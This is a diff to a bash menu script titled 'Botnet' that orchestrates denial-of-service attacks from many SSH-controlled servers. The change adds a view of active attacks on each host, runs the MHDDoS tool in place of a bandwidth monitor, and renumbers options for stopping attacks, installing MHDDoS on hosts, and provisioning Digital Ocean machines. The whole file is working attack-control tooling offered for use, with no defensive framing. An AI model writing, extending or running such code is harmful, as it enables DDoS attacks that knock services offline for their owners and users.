@@ -5,7 +5,7 @@ touch -a "$CURRENT_DIR/hosts.txt"
 export DIALOGRC="$CURRENT_DIR/.dialogrc"
 
 while : ; do
-    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Before the start populate your hosts.txt file!" 15 55 5  1 'Botnet attack on host' 2 'Bandwidth monitoring' 3 'Stop all botnet attacks' 4 'Stop certain host/ip attack in botnet' 5 'Setup SSH hosts' 6 'Cloud providers' 7 'Exit')
+    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Before the start populate your hosts.txt file!" 15 55 8  1 'Botnet attack on host' 2 'Bandwidth monitoring' 3 'Show current attacks' 4 'Stop all botnet attacks' 5 'Stop certain host/ip attack in botnet' 6 'Setup SSH hosts' 7 'Cloud providers' 8 'Exit')
 
     case $MENU_OPTION in
 
@@ -63,24 +63,37 @@ while : ; do
         MENU_OPTION=$(dialog --title 'Bandwidth monitoring' --menu --stdout "Choose host to monitor:" 15 55 ${#options[@]} "${options[@]}")
         HOST=${options[$MENU_OPTION*2-1]}
 
-        ssh -t "root@$HOST" 'bmon -p eth0 -o curses:details'
+        ssh -t "root@$HOST" 'python3 MHDDoS/start.py TOOLS'
         break
         ;;
 
     3)
+        echo "Loading..."
+        while read -r host
+        do
+            processes=$(ssh -n "root@$host" "ps -aux | grep start.py | grep -v grep | grep -vi screen" | awk '{print $13, $14}' | sed 's/^/    /')
+            output+="$host\n$processes\n\n"
+        done < "$CURRENT_DIR/hosts.txt"
+        printf "$output" > "$CURRENT_DIR/output.txt"
+        dialog --title "Hosts and their active attacks" --textbox "$CURRENT_DIR/output.txt" 30 50
+
+        break
+        ;;
+
+    4)
         bash "$CURRENT_DIR/runoverssh" root "killall screen" --hostsfile "$CURRENT_DIR/hosts.txt"
         break
         ;;
 
 
-    4)
+    5)
         TARGET=$(bash "${CURRENT_DIR}/url.sh")
         bash "$CURRENT_DIR/runoverssh" root "pkill -f '$TARGET'" --hostsfile "$CURRENT_DIR/hosts.txt"
 
         break
         ;;
 
-    5)
+    6)
         if dialog --title "Setup SSH hosts" --stdout --yesno "Following command will install MHDDoS tool to your SSH hosts\n                    Do you want to proceed?" 7 65; then
           CURRENT_DIR=$(dirname "$0")
           bash "$CURRENT_DIR/runoverssh" --script "$CURRENT_DIR/attacker-setup.sh" --hostsfile "$CURRENT_DIR/hosts.txt" root
@@ -88,7 +101,7 @@ while : ; do
         break
         ;;
 
-    6)
+    7)
         MENU_OPTION=$(dialog --title 'Cloud providers' --menu --stdout "Choose option:" 15 55 2 1 'Digital Ocean' 2 'Back')
         case $MENU_OPTION in
 
@@ -156,7 +169,7 @@ while : ; do
         break
         ;;
 
-    7)
+    8)
         break
         ;;
 
